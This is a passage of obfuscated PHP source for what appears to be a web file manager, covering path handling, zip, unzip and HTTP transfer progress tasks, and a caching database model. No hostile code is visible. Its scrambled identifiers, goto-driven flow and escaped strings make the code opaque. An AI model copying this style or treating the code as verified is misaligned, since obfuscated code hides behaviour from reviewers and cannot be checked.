CùŠËôŞ–‰: if ($CšÈÙõÇ•->pathParse[$d‹¥òï¤¦[1002]]) { $d’·é›‹æ  = $CšÈÙõÇ•->pathParse[$d‹¥òï¤¦[1002]]; } else { $d’·é›‹æ  = $e±ŸÍß‹Óâ; } $CÙ÷çåÃ§å = IO::copyMove($fñĞ¯°Ã‚ë, $d’·é›‹æ , $e ›õï†¢‡, $BœµŞÇÑ¾«); $CÙ÷çåÃ§å = $this->getPathOuter($CÙ÷çåÃ§å); goto D‰ôê°Ö¼; dÙÅóÖ¨¬: } public function pathFather($c‰à¾Òµ×) { return get_path_father($this->pathParse[$_SERVER[´Ù×Íå‘ÄõÛ][75]]); } public function iconvSystem($aĞ…ÉºÆÌ) { return $aĞ…ÉºÆÌ; } protected function infoParse($f—ÊßÓ»°ì, $d¦¦Ôµ”¹ƒ = false) { $dá×ïâ­ÍË =& $_SERVER[´Ù×Íå‘ÄõÛ]; $BÎİ½áÀÎ = $this->pathParse[$dá×ïâ­ÍË[439]][$dá×ïâ­ÍË[1023]] . $this->pathParse[$dá×ïâ­ÍË[1016]]; if ($d¦¦Ôµ”¹ƒ) { $CÅÃó­¤È = IO::infoWithChildren($BÎİ½áÀÎ); } else { $CÅÃó­¤È = IO::info($BÎİ½áÀÎ); } $fôí¸ƒôÒ = $this->pathParse[$dá×ïâ­ÍË[439]]; return Action($dá×ïâ­ÍË[1128])->_shareItemeParse($CÅÃó­¤È, $fôí¸ƒôÒ); } public function listAll($EàØô¦É‚ª) { $cÑ‚è¢ÀÙ³ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cÄÙ‹”—ãÀ = IO::listAll($EàØô¦É‚ª); $fÅçÉíâ—ï = $this->pathParse[$cÑ‚è¢ÀÙ³[439]]; foreach ($cÄÙ‹”—ãÀ as &$BíŠ­îÊ¢ô) { check_abort(); $BíŠ­îÊ¢ô = array_merge(IO::info($BíŠ­îÊ¢ô[$cÑ‚è¢ÀÙ³[75]]), $BíŠ­îÊ¢ô); $BíŠ­îÊ¢ô[$cÑ‚è¢ÀÙ³[391]] = Action($cÑ‚è¢ÀÙ³[1128])->_shareItemeParse($BíŠ­îÊ¢ô, $fÅçÉíâ—ï); } return $cÄÙ‹”—ãÀ; } public function getPathOuter($cíµ¬œÎºÍ) { goto AÀøš¶†šÔ; AÀøš¶†šÔ: $EĞ‡ÔõĞçì =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E„Ò™Ô…Ø‰ = KodIO::parse($cíµ¬œÎºÍ); if ($E„Ò™Ô…Ø‰[$EĞ‡ÔõĞçì[29]] == KodIO::KOD_SHARE_ITEM) { return $E„Ò™Ô…Ø‰[$EĞ‡ÔõĞçì[75]]; } goto c¬½ÉœÚÜÑ; c¬½ÉœÚÜÑ: $aÖ´¾ºã† = KodIO::clear($cíµ¬œÎºÍ); $cáÊÌ»Œ™‘ = KodIO::clear($this->pathParse[$EĞ‡ÔõĞçì[439]][$EĞ‡ÔõĞçì[1023]]); $A’×Ï®ñåÜ = substr($aÖ´¾ºã†, strlen($cáÊÌ»Œ™‘)); goto A˜‘×ˆÀ; A˜‘×ˆÀ: if (substr($aÖ´¾ºã†, 0, strlen($cáÊÌ»Œ™‘)) != $cáÊÌ»Œ™‘) { return !1; } return $this->pathParse[$EĞ‡ÔõĞçì[1017]] . $EĞ‡ÔõĞçì[8] . ltrim($A’×Ï®ñåÜ, $EĞ‡ÔõĞçì[8]); goto a¥ñó¬İ¸É; a¥ñó¬İ¸É: } public function getType() { $D‰º«Šó‚Ç =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A²£ÍĞáí = str_replace($D‰º«Šó‚Ç[71], $D‰º«Šó‚Ç[33], get_class($this)); return strtolower($A²£ÍĞáí); } public function isTypeObject($CÕõ”ƒ’‡Ä) { return IO::isTypeObject($CÕõ”ƒ’‡Ä); } public function info($aÆ—‹¨ƒ©£) { return $this->infoParse($aÆ—‹¨ƒ©£); } public function infoAuth($C¶Ë¾¥ê»ˆ) { return $this->infoParse($C¶Ë¾¥ê»ˆ); } public function infoWithChildren($Eƒ¢ßÔ½ä) { return $this->infoParse($Eƒ¢ßÔ½ä, !0); } public function infoFull($fÀ¹¿ğÄƒº) { return $this->infoParse($fÀ¹¿ğÄƒº); } } goto F»‹¨³Ø¤; bõ¾’‹–±ó: define($_SERVER[´Ù×Íå‘ÄõÛ][227], 2); define($_SERVER[´Ù×Íå‘ÄõÛ][228], 3); define($_SERVER[´Ù×Íå‘ÄõÛ][229], 1); goto B÷òÉ ãšÖ; b‹ƒ‘¯¸ß: class TaskHttp extends Task { protected function startAfter() { $f©¹Ÿ±à„Ï =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aÑŸ¿Ú =& $this->task; $aÑŸ¿Ú[$f©¹Ÿ±à„Ï[1505]] = 1; Hook::bind($f©¹Ÿ±à„Ï[1478], array($this, $f©¹Ÿ±à„Ï[1506])); Hook::bind($f©¹Ÿ±à„Ï[1480], array($this, $f©¹Ÿ±à„Ï[1507])); Hook::bind($f©¹Ÿ±à„Ï[1482], array($this, $f©¹Ÿ±à„Ï[1508])); } protected function endAfter() { $CÓ¾ĞØŠ–è =& $_SERVER[´Ù×Íå‘ÄõÛ]; Hook::unbind($CÓ¾ĞØŠ–è[1478], array($this, $CÓ¾ĞØŠ–è[1506])); Hook::unbind($CÓ¾ĞØŠ–è[1480], array($this, $CÓ¾ĞØŠ–è[1507])); Hook::unbind($CÓ¾ĞØŠ–è[1482], array($this, $CÓ¾ĞØŠ–è[1508])); } public function progressStart($bÁìß¤äÕŸ) { $B®™»ïé =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Dœª–‚‘×‰ = curl_getinfo($bÁìß¤äÕŸ); self::log($B®™»ïé[1509] . $Dœª–‚‘×‰[$B®™»ïé[295]]); self::valueSet($this->task[$B®™»ïé[367]], $this->task); } public function progressEnd($d§Ùó”ÕÕ·) { $Eä‰óÎÌ×Ü =& $_SERVER[´Ù×Íå‘ÄõÛ]; self::log($Eä‰óÎÌ×Ü[1510] . $this->task[$Eä‰óÎÌ×Ü[367]]); $this->end(); } public function progress($Cø†¶†·“…, $cö³×òÃ†ç, $f°ºİìä, $D‡Çîåó‘‚, $F‹¥›½™±Ú) { $BÛ²Šâ° =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D›õÌ„Öç =& $this->task; if ($F‹¥›½™±Ú > 0) { $D›õÌ„Öç[$BÛ²Šâ°[980]] = $D›õÌ„Öç[$BÛ²Šâ°[980]] == 0 ? $D‡Çîåó‘‚ : $D›õÌ„Öç[$BÛ²Šâ°[980]]; $D›õÌ„Öç[$BÛ²Šâ°[994]] = $F‹¥›½™±Ú; } else { if ($f°ºİìä > 0) { $D›õÌ„Öç[$BÛ²Šâ°[980]] = $D›õÌ„Öç[$BÛ²Šâ°[980]] == 0 ? $cö³×òÃ†ç : $D›õÌ„Öç[$BÛ²Šâ°[980]]; $D›õÌ„Öç[$BÛ²Šâ°[994]] = $f°ºİìä; } } $this->update(); self::log("\160\x72\x6f\x67\162\145\x73\163\110\x74\x74\160\72\x64\157\x77\x6e\x3a{$f°ºİìä}\57{$cö³×òÃ†ç}\73\40\x75\x70\154\157\x61\144\72{$F‹¥›½™±Ú}\x2f{$D‡Çîåó‘‚}\x3b"); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto AÆÆ¦¨‘˜; AÆÆ¦¨‘˜: $cÔ¦÷†Õ“ì =& $_SERVER[´Ù×Íå‘ÄõÛ]; parent::startAfter(); Hook::bind($cÔ¦÷†Õ“ì[1511], array($this, $cÔ¦÷†Õ“ì[1512])); goto c„äöÍ¤; e¤«÷ÅËéš: if (!$EŠ±…³ª‚°[$cÔ¦÷†Õ“ì[1347]]) { $EŠ±…³ª‚°[$cÔ¦÷†Õ“ì[1347]] = LNG($cÔ¦÷†Õ“ì[1515]); } goto a…Ó¨é“ÂÓ; c„äöÍ¤: Hook::bind($cÔ¦÷†Õ“ì[1039], array($this, $cÔ¦÷†Õ“ì[1513])); $EŠ±…³ª‚° =& $this->task; $EŠ±…³ª‚°[$cÔ¦÷†Õ“ì[1514]] = $cÔ¦÷†Õ“ì[1044]; goto e¤«÷ÅËéš; a…Ó¨é“ÂÓ: } protected function endAfter() { $AŞåö³ì‡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; parent::endAfter(); Hook::unbind($AŞåö³ì‡[1511], array($this, $AŞåö³ì‡[1512])); Hook::unbind($AŞåö³ì‡[1039], array($this, $AŞåö³ì‡[1513])); } public function updateAfter() { $béÑŠŸ¤Û— =& $_SERVER[´Ù×Íå‘ÄõÛ]; $dÙ«ÔÍ™ =& $this->task; if (!$dÙ«ÔÍ™[$béÑŠŸ¤Û—[980]] || !$dÙ«ÔÍ™[$béÑŠŸ¤Û—[699]]) { return; } if ($dÙ«ÔÍ™[$béÑŠŸ¤Û—[1514]] == $béÑŠŸ¤Û—[1044]) { $EÄ¯ÙŸ· = 0; if ($dÙ«ÔÍ™[$béÑŠŸ¤Û—[1486]]) { $EÄ¯ÙŸ· = $dÙ«ÔÍ™[$béÑŠŸ¤Û—[1487]] / $dÙ«ÔÍ™[$béÑŠŸ¤Û—[1486]]; } $dÙ«ÔÍ™[$béÑŠŸ¤Û—[1442]] = $EÄ¯ÙŸ· * 0.3; } else { if ($dÙ«ÔÍ™[$béÑŠŸ¤Û—[1514]] == $béÑŠŸ¤Û—[301]) { $EÄ¯ÙŸ· = $dÙ«ÔÍ™[$béÑŠŸ¤Û—[994]] / $dÙ«ÔÍ™[$béÑŠŸ¤Û—[980]]; $dÙ«ÔÍ™[$béÑŠŸ¤Û—[1442]] = 0.3 + $EÄ¯ÙŸ· * 0.4; } else { if ($dÙ«ÔÍ™[$béÑŠŸ¤Û—[1514]] == $béÑŠŸ¤Û—[103]) { $dƒ”Œå¹³— = 0; if ($dÙ«ÔÍ™[$béÑŠŸ¤Û—[1488]] == $béÑŠŸ¤Û—[103]) { $dƒ”Œå¹³— = $dÙ«ÔÍ™[$béÑŠŸ¤Û—[1487]]; } $EÄ¯ÙŸ· = ($dÙ«ÔÍ™[$béÑŠŸ¤Û—[1491]] + $dƒ”Œå¹³—) / $dÙ«ÔÍ™[$béÑŠŸ¤Û—[699]]; $dÙ«ÔÍ™[$béÑŠŸ¤Û—[1442]] = 0.3 + 0.4 + $EÄ¯ÙŸ· * 0.3; } } } if ($dÙ«ÔÍ™[$béÑŠŸ¤Û—[1442]] > 0) { $EØ»¬…ôöÁ = timeFloat() - $dÙ«ÔÍ™[$béÑŠŸ¤Û—[1444]] - $dÙ«ÔÍ™[$béÑŠŸ¤Û—[1447]]; $dÙ«ÔÍ™[$béÑŠŸ¤Û—[1448]] = $EØ»¬…ôöÁ * (1 - $dÙ«ÔÍ™[$béÑŠŸ¤Û—[1442]]) / $dÙ«ÔÍ™[$béÑŠŸ¤Û—[1442]]; } } public function addFile($Dƒ‹„­íÙ¥) { goto B ”·µŠÃ‚; c£†”Æê¡é: $eİ¦©Ææß’[$bİĞîÓ—[980]] = 1; $dÊ‰ÄÇ¦¨ = 0; $eİ¦©Ææß’[$bİĞîÓ—[1495]] = array($bİĞîÓ—[1496] => $dÊ‰ÄÇ¦¨ + 1, $bİĞîÓ—[386] => $F¬›†Ç™Ÿ»[$bİĞîÓ—[28]], $bİĞîÓ—[75] => $F¬›†Ç™Ÿ»[$bİĞîÓ—[75]], $bİĞîÓ—[468] => $F¬›†Ç™Ÿ»[$bİĞîÓ—[468]] ? $F¬›†Ç™Ÿ»[$bİĞîÓ—[468]] : $F¬›†Ç™Ÿ»[$bİĞîÓ—[75]]); goto fòÚ¤æÏ“; c©æ ‰—–å: $eİ¦©Ææß’[$bİĞîÓ—[982]] = $bİĞîÓ—[1503]; $eİ¦©Ææß’[$bİĞîÓ—[1488]] = $bİĞîÓ—[1044]; $eİ¦©Ææß’[$bİĞîÓ—[699]] = $F¬›†Ç™Ÿ»[$bİĞîÓ—[77]]; goto c£†”Æê¡é; fòÚ¤æÏ“: $this->update(); goto aòœË£¬Ş; B¨ôÍÉ”—­: $eİ¦©Ææß’[$bİĞîÓ—[1484]] = $F¬›†Ç™Ÿ»[$bİĞîÓ—[28]]; $eİ¦©Ææß’[$bİĞîÓ—[1486]] = $F¬›†Ç™Ÿ»[$bİĞîÓ—[77]]; $eİ¦©Ææß’[$bİĞîÓ—[1487]] = 0; goto c©æ ‰—–å; B ”·µŠÃ‚: $bİĞîÓ— =& $_SERVER[´Ù×Íå‘ÄõÛ]; $eİ¦©Ææß’ =& $this->task; $F¬›†Ç™Ÿ» = IO::info($Dƒ‹„­íÙ¥); goto B¨ôÍÉ”—­; aòœË£¬Ş: } public function unzipAfter($Dí¿Ü¯ì»») { goto dˆäËÍšÕ¸; eĞ„î¡„ìö: $b‚Ö˜ãšËÈ[$bæõ¿«ùë‹[994]] = 0; $b‚Ö˜ãšËÈ[$bæõ¿«ùë‹[1486]] = 0; $b‚Ö˜ãšËÈ[$bæõ¿«ùë‹[1487]] = 0; goto f¡Ã÷Â°ÇÉ; BÑÒ£÷æ¶¸: $this->update(); self::log($bæõ¿«ùë‹[1516] . json_encode(array($b‚Ö˜ãšËÈ, $FŠêñ´—ÀĞ))); goto a¹ÇÂĞªİ¥; f¡Ã÷Â°ÇÉ: $b‚Ö˜ãšËÈ[$bæõ¿«ùë‹[1484]] = $bæõ¿«ùë‹[33]; $b‚Ö˜ãšËÈ[$bæõ¿«ùë‹[1491]] = 0; $b‚Ö˜ãšËÈ[$bæõ¿«ùë‹[699]] = $FŠêñ´—ÀĞ[$bæõ¿«ùë‹[77]]; goto BÑÒ£÷æ¶¸; dˆäËÍšÕ¸: $bæõ¿«ùë‹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $b‚Ö˜ãšËÈ =& $this->task; $b‚Ö˜ãšËÈ[$bæõ¿«ùë‹[1514]] = $bæõ¿«ùë‹[103]; goto fÒ·ä ‰ÙØ; fÒ·ä ‰ÙØ: $FŠêñ´—ÀĞ = IO::infoWithChildren($Dí¿Ü¯ì»»); $fÃî¸¢œ„ğ = 0; $b‚Ö˜ãšËÈ[$bæõ¿«ùë‹[1495]] = array($bæõ¿«ùë‹[1496] => $fÃî¸¢œ„ğ + 1, $bæõ¿«ùë‹[386] => $FŠêñ´—ÀĞ[$bæõ¿«ùë‹[28]], $bæõ¿«ùë‹[75] => $FŠêñ´—ÀĞ[$bæõ¿«ùë‹[75]], $bæõ¿«ùë‹[468] => $FŠêñ´—ÀĞ[$bæõ¿«ùë‹[468]] ? $FŠêñ´—ÀĞ[$bæõ¿«ùë‹[468]] : $FŠêñ´—ÀĞ[$bæõ¿«ùë‹[75]]); goto dª»ëÕá; dª»ëÕá: if ($FŠêñ´—ÀĞ[$bæõ¿«ùë‹[29]] == $bæõ¿«ùë‹[167]) { $b‚Ö˜ãšËÈ[$bæõ¿«ùë‹[980]] = 1; } else { $b‚Ö˜ãšËÈ[$bæõ¿«ùë‹[980]] = $FŠêñ´—ÀĞ[$bæõ¿«ùë‹[80]][$bæõ¿«ùë‹[78]]; } $b‚Ö˜ãšËÈ[$bæõ¿«ùë‹[982]] = $bæõ¿«ùë‹[33]; $b‚Ö˜ãšËÈ[$bæõ¿«ùë‹[1488]] = 0; goto eĞ„î¡„ìö; a¹ÇÂĞªİ¥: } public function nameParse($CÀ„Ù„Í¥) { goto C¤Ø¦Õ±Û¬; C¤Ø¦Õ±Û¬: $D£¹‡Îğ² =& $_SERVER[´Ù×Íå‘ÄõÛ]; $bòÂñ—Á‹¿ =& $this->task; if ($bòÂñ—Á‹¿[$D£¹‡Îğ²[1514]] == $D£¹‡Îğ²[1044]) { $bòÂñ—Á‹¿[$D£¹‡Îğ²[1514]] = $D£¹‡Îğ²[301]; $bòÂñ—Á‹¿[$D£¹‡Îğ²[1491]] = 0; $bòÂñ—Á‹¿[$D£¹‡Îğ²[699]] = 0; } goto c¿íÍ‰ğ‰Ó; c¿íÍ‰ğ‰Ó: $dÚâ³Œñ”Ç = get_path_this($CÀ„Ù„Í¥); if (strstr($dÚâ³Œñ”Ç, $D£¹‡Îğ²[91])) { $bòÂñ—Á‹¿[$D£¹‡Îğ²[994]] += 1; $bòÂñ—Á‹¿[$D£¹‡Îğ²[980]] += 1; } $bòÂñ—Á‹¿[$D£¹‡Îğ²[1484]] = $CÀ„Ù„Í¥; goto Aİíáø–ê ; Aİíáø–ê : $this->update(); goto cæá®œÚµè; cæá®œÚµè: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $fô‹Şµ¤×¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; parent::startAfter(); Hook::bind($fô‹Şµ¤×¦[1517], array($this, $fô‹Şµ¤×¦[1512])); $cËÏ™³¡é‘ =& $this->task; $cËÏ™³¡é‘[$fô‹Şµ¤×¦[1514]] = $fô‹Şµ¤×¦[1044]; if (!$cËÏ™³¡é‘[$fô‹Şµ¤×¦[1347]]) { $cËÏ™³¡é‘[$fô‹Şµ¤×¦[1347]] = LNG($fô‹Şµ¤×¦[1518]); } } protected function endAfter() { $FêÅÆ¤˜¸ =& $_SERVER[´Ù×Íå‘ÄõÛ]; parent::endAfter(); Hook::unbind($FêÅÆ¤˜¸[1517], array($this, $FêÅÆ¤˜¸[1512])); } public function updateAfter() { $E­å·¬¨— =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÊçâ¨ø¬‰ =& $this->task; if (!$CÊçâ¨ø¬‰[$E­å·¬¨—[980]] || !$CÊçâ¨ø¬‰[$E­å·¬¨—[699]]) { return; } if ($CÊçâ¨ø¬‰[$E­å·¬¨—[1514]] == $E­å·¬¨—[1044]) { $C¸™ ñ¿«Ş = $CÊçâ¨ø¬‰[$E­å·¬¨—[1487]]; if ($CÊçâ¨ø¬‰[$E­å·¬¨—[1488]] != $E­å·¬¨—[1044]) { $C¸™ ñ¿«Ş = 0; } $bèŸÜ»…œ§ = ($CÊçâ¨ø¬‰[$E­å·¬¨—[1491]] + $C¸™ ñ¿«Ş) / $CÊçâ¨ø¬‰[$E­å·¬¨—[699]]; $CÊçâ¨ø¬‰[$E­å·¬¨—[1442]] = $bèŸÜ»…œ§ * 0.3; } else { if ($CÊçâ¨ø¬‰[$E­å·¬¨—[1514]] == $E­å·¬¨—[301]) { $bèŸÜ»…œ§ = $CÊçâ¨ø¬‰[$E­å·¬¨—[994]] / $CÊçâ¨ø¬‰[$E­å·¬¨—[980]]; $CÊçâ¨ø¬‰[$E­å·¬¨—[1442]] = 0.3 + $bèŸÜ»…œ§ * 0.5; } else { if ($CÊçâ¨ø¬‰[$E­å·¬¨—[1514]] == $E­å·¬¨—[103]) { $bèŸÜ»…œ§ = 0; if ($CÊçâ¨ø¬‰[$E­å·¬¨—[1486]]) { $bèŸÜ»…œ§ = $CÊçâ¨ø¬‰[$E­å·¬¨—[1487]] / $CÊçâ¨ø¬‰[$E­å·¬¨—[1486]]; } $CÊçâ¨ø¬‰[$E­å·¬¨—[1442]] = 0.3 + 0.5 + $bèŸÜ»…œ§ * 0.2; } } } if ($CÊçâ¨ø¬‰[$E­å·¬¨—[1442]] > 0) { $E“ °šÙƒ = timeFloat() - $CÊçâ¨ø¬‰[$E­å·¬¨—[1444]] - $CÊçâ¨ø¬‰[$E­å·¬¨—[1447]]; $CÊçâ¨ø¬‰[$E­å·¬¨—[1448]] = $E“ °šÙƒ * (1 - $CÊçâ¨ø¬‰[$E­å·¬¨—[1442]]) / $CÊçâ¨ø¬‰[$E­å·¬¨—[1442]]; } } public function copyFileStart($c·„§ñ½“¦, $E³èŞêªêÕ, $c·¶ƒÕùÕÔ, $b¸Ú¾šÓÄÈ, $AŸ¡®…ß, $B¯İ…™‡ó„) { $EÛëâµ±»Ù =& $_SERVER[´Ù×Íå‘ÄõÛ]; parent::copyFileStart($c·„§ñ½“¦, $E³èŞêªêÕ, $c·¶ƒÕùÕÔ, $b¸Ú¾šÓÄÈ, $AŸ¡®…ß, $B¯İ…™‡ó„); $båªŞ‚İÂî =& $this->task; if ($båªŞ‚İÂî[$EÛëâµ±»Ù[1514]] == $EÛëâµ±»Ù[301]) { $båªŞ‚İÂî[$EÛëâµ±»Ù[1514]] = $EÛëâµ±»Ù[103]; } $this->update(); } public function copyFileEnd($c‚™Æİƒµ±, $F¶Ê…áÂø, $Bö¯Òœìà©, $EÍËåôÁ×, $e ‚ô’‚Ä, $A Ğ¡±šÜ¬) { $fÂ¸¯‰¬Û¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Fçœ¼­ßÅ =& $this->task; $Fçœ¼­ßÅ[$fÂ¸¯‰¬Û¦[1487]] = $Fçœ¼­ßÅ[$fÂ¸¯‰¬Û¦[1486]]; $Fçœ¼­ßÅ[$fÂ¸¯‰¬Û¦[1491]] += $Fçœ¼­ßÅ[$fÂ¸¯‰¬Û¦[1486]]; $Fçœ¼­ßÅ[$fÂ¸¯‰¬Û¦[1488]] = $fÂ¸¯‰¬Û¦[33]; $this->update(); } public function nameParse($DÑ’²è£Ä“) { $FÓİ´Úáƒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a¥•¼ò‚µß =& $this->task; if ($a¥•¼ò‚µß[$FÓİ´Úáƒ[994]] < $a¥•¼ò‚µß[$FÓİ´Úáƒ[980]]) { $e‰ÇæØ¤Ğ = get_path_this($DÑ’²è£Ä“); if (strstr($e‰ÇæØ¤Ğ, $FÓİ´Úáƒ[91])) { $a¥•¼ò‚µß[$FÓİ´Úáƒ[994]] += 1; } } if ($a¥•¼ò‚µß[$FÓİ´Úáƒ[1514]] == $FÓİ´Úáƒ[1044]) { $a¥•¼ò‚µß[$FÓİ´Úáƒ[1514]] = $FÓİ´Úáƒ[301]; } $a¥•¼ò‚µß[$FÓİ´Úáƒ[1484]] = $DÑ’²è£Ä“; $this->update(); } } goto eá¡Ç„ñ£ì; eÍ¡âğâĞ›: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\146\x79\124\151\x6d\145", "\164\151\x6d\145", "\x69\x6e\x73\145\162\164\54\x75\160\144\141\164\145", "\x66\165\156\143\x74\x69\x6f\156"), array("\x63\x72\145\141\164\145\124\x69\155\145", "\164\x69\x6d\x65", "\151\x6e\163\x65\x72\x74", "\146\x75\156\143\164\x69\157\156")); public function setDataAuto($báÔ½±†ÓÁ) { $this->dataAuto = $báÔ½±†ÓÁ; } public function __construct($F“¹”…ßËÈ = '', $E×Ş¶Îçì… = '', $c’ï‹Ù‘æ = '') { parent::__construct($F“¹”…ßËÈ, $E×Ş¶Îçì…, $c’ï‹Ù‘æ); } public static function textEncode($E‘‰æÏ¹ÙÜ) { if (!$E‘‰æÏ¹ÙÜ) { return $E‘‰æÏ¹ÙÜ; } $dåë˜ìğ‡ = json_encode($E‘‰æÏ¹ÙÜ); $dåë˜ìğ‡ = preg_replace_callback($_SERVER[´Ù×Íå‘ÄõÛ][342], function ($DÂºŒ„ÀçÛ) { return addslashes($DÂºŒ„ÀçÛ[0]); }, $dåë˜ìğ‡); return json_decode($dåë˜ìğ‡); } public static function textDecode($fŞâÑŸª‘¡) { $c¨ÉÀ´î¦” =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Bùù“Û‰®½ = json_encode($fŞâÑŸª‘¡); $Bùù“Û‰®½ = preg_replace_callback($c¨ÉÀ´î¦”[343], function ($CÒ’‚–°æ£) { return $_SERVER[´Ù×Íå‘ÄõÛ][93]; }, $Bùù“Û‰®½); return json_decode($Bùù“Û‰®½); } protected $tableMeta = array(); protected function _beforeInsert(&$f¬Ê•Ï§á, $bÃ˜¸²ÔÀ) { $fß›ˆá„¾¡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->checkDataAutoHas($fß›ˆá„¾¡[344])) { return; } $this->dataBeforeFilter($f¬Ê•Ï§á, $fß›ˆá„¾¡[344]); } protected function _beforeUpdate(&$fó·×óì, $d§ÉÍ÷–ëÃ) { $AÀ§‘ëç =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$this->checkDataAutoHas($AÀ§‘ëç[345])) { return; } $this->dataBeforeFilter($fó·×óì, $AÀ§‘ëç[345]); } protected function _afterSelect(&$f¢“ìí‚íô, $AÔ¥İğá•) { if (!is_array($f¢“ìí‚íô)) { return; } if (!$this->checkDataAutoHas($_SERVER[´Ù×Íå‘ÄõÛ][346])) { return; } foreach ($f¢“ìí‚íô as &$eöğ÷Èø‡¹) { $this->dataAfterFilter($eöğ÷Èø‡¹); } } protected function _afterFind(&$A•ïòµÃÊœ, $eÀŒİµİ©“) { if (!is_array($A•ïòµÃÊœ)) { return; } if (!$this->checkDataAutoHas($_SERVER[´Ù×Íå‘ÄõÛ][346])) { return; } $this->dataAfterFilter($A•ïòµÃÊœ); } public function setAutoIncrement($FÔˆÈƒƒÊç) { $cø³ö¯¿ë† = array($this->getPk() => $FÔˆÈƒƒÊç); $BÒ¶öÜñ§ä = $this->data($cø³ö¯¿ë†)->add(); if ($BÒ¶öÜñ§ä) { $this->delete($BÒ¶öÜñ§ä); } } public function getAutoIncrement() { $a ÃÍ·”Ãø = $this->getTableName(); $F¾Îéó„Ûó = $this->max($this->getPk()); $c‚ÎÒÚñí… = $this->query("\163\x68\x6f\167\x20\164\x61\142\154\145\x20\x73\x74\x61\x74\165\163\40\x77\x68\x65\x72\x65\40\x4e\x61\x6d\145\75\x27{$a ÃÍ·”Ãø}\47"); $bøŸĞÚÛ = $c‚ÎÒÚñí…[0][$_SERVER[´Ù×Íå‘ÄõÛ][347]]; $C¦ìÂèéÀ = max($F¾Îéó„Ûó, $bøŸĞÚÛ); return $C¦ìÂèéÀ; } protected function _callBefore($CÒìğ¡»¸‹, $cêÚíæàïÇ) { return $this->cacheCallCheck($CÒìğ¡»¸‹, $cêÚíæàïÇ, !1); } protected function _callAfter($d¬¢È·‘Ö, $dÁèòÙ´¡º) { return $this->cacheCallCheck($d¬¢È·‘Ö, $dÁèòÙ´¡º, !0); } protected function cacheFunctionAlias($dãŠàÙ³¾¸) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($e—¡—±é†, $c§‰½º©²ö, $DçİÈÉÑ¹á = false) { $b‚Šä„¤Á® = $this->cacheFunctionAlias($c§‰½º©²ö); if (!$b‚Šä„¤Á®) { return; } foreach ($b‚Šä„¤Á® as $b¼½ßÖ°¶Ø => $AÏë†Äîµ) { $E‰ÂË»¢ˆÆ = $AÏë†Äîµ[0]; $D¦Üß‘Ğ×» = explode($_SERVER[´Ù×Íå‘ÄõÛ][47], $AÏë†Äîµ[1]); if ($e—¡—±é† == $b¼½ßÖ°¶Ø) { return $this->cacheFunctionGet($b¼½ßÖ°¶Ø, $E‰ÂË»¢ˆÆ); } if ($DçİÈÉÑ¹á && in_array($e—¡—±é†, $D¦Üß‘Ğ×»)) { $this->cacheFunctionClear($b¼½ßÖ°¶Ø, $E‰ÂË»¢ˆÆ); } } } public function cacheFunctionGet($b­ˆÆ™–çº, $BŸŒâ‰à©˜) { $Eˆ„É¯Ğ¿ñ = $this->cacheKeyMake($b­ˆÆ™–çº, $BŸŒâ‰à©˜); $E¯Ÿ…«‚²‰ = Cache::get($Eˆ„É¯Ğ¿ñ); if (!is_array($E¯Ÿ…«‚²‰)) { $E¯Ÿ…«‚²‰ = call_user_func_array(array($this, $b­ˆÆ™–çº), array($BŸŒâ‰à©˜, !0)); Cache::set($Eˆ„É¯Ğ¿ñ, $E¯Ÿ…«‚²‰); } return $E¯Ÿ…«‚²‰; } public function cacheFunctionClear($BÃº£ã“ÛÂ, $Fá›÷ëòõ) { $eá „ĞÛÃÄ = $Fá›÷ëòõ; if (!is_array($Fá›÷ëòõ)) { $eá „ĞÛÃÄ = array($Fá›÷ëòõ); } foreach ($eá „ĞÛÃÄ as $bïöØµ”ã‰) { $E¾õæ¡‰Š¨ = $this->cacheKeyMake($BÃº£ã“ÛÂ, $bïöØµ”ã‰); Cache::remove($E¾õæ¡‰Š¨); } } private function cacheKeyMake($eŒ‹àÄÄù¿, $A¿¾à˜ˆ¦Š) { $aç‰¾•Ì´Å =& $_SERVER[´Ù×Íå‘ÄõÛ]; return get_class($this) . $aç‰¾•Ì´Å[70] . $eŒ‹àÄÄù¿ . $aç‰¾•Ì´Å[348] . $A¿¾à˜ˆ¦Š; } protected function selectPage($DƒÜ‘Ş‚ø† = 200, $B’½äõÅ¾ = 1) { goto C›†ÇïØÄÓ; Bª§ÀíÑ˜Ç: $D•êÍÂèÁË = $FµğÁ‹Ç¿¹; $D•êÍÂèÁË[$D†‚Í²ùô[350]] = array(); $this->optionsValue($D•êÍÂèÁË); goto EàçãÍÂ; aïìØœÓ: $dÅÎĞÄ–ƒ = 4000; $DƒÜ‘Ş‚ø† = isset($in[$D†‚Í²ùô[349]]) ? $in[$D†‚Í²ùô[349]] : $DƒÜ‘Ş‚ø†; if ($DƒÜ‘Ş‚ø† === -1) { unset($in[$D†‚Í²ùô[349]]); $dÅÎĞÄ–ƒ = 100000000; $DƒÜ‘Ş‚ø† = $dÅÎĞÄ–ƒ; } goto Bª§ÀíÑ˜Ç; bê¤¯ª£½: $this->optionsValue($FµğÁ‹Ç¿¹); $FŞ‘Ô””À· = $this->page($B’½äõÅ¾, $DƒÜ‘Ş‚ø†)->select(); $FŞ‘Ô””À· = is_array($FŞ‘Ô””À·) ? $FŞ‘Ô””À· : array(); goto c•­•·¿äŠ; E‡­éĞô±¹: $A’ÁÙĞàŸ„ = ceil($B´äæˆáˆÕ / $DƒÜ‘Ş‚ø†); $B’½äõÅ¾ = intval(isset($in[$D†‚Í²ùô[340]]) ? $in[$D†‚Í²ùô[340]] : $B’½äõÅ¾); $B’½äõÅ¾ = 